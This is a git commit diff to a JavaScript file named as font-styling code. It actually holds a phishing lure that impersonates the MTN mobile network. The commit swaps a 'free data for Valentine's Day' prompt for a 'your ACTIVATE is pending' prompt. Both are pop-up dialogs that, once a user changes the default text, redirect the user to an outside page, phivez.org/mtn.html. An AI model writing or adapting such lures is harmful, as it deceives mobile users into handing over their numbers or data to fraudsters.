3011b5d628b1357a264a46374fce4bdb960a774a
newblog13 <sweet16guyz@gmail.com>
2026-02-16 08:17:56 +0100

    Update div-class-id-verify-font-style.js

--- div-class-id-verify-font-style.js
+++ div-class-id-verify-font-style.js
@@ -1,5 +1,5 @@
-var password = '1 MONTH FREE DATA'
-password=prompt('SMS: Happy Valentines Day, your MTN Number is eligible to receive 1 Month Free Data, click OK to Enter Your Mobile Number','1 MONTH FREE DATA');
-if (password != '1 MONTH FREE DATA') {
+var password = 'ACTIVATE'
+password=prompt('MTN: Yello, Your ACTIVATE is Pending Click Ok to Activate Now','ACTIVATE');
+if (password != 'ACTIVATE') {
 location.href='https://phivez.org/mtn.html';
 }
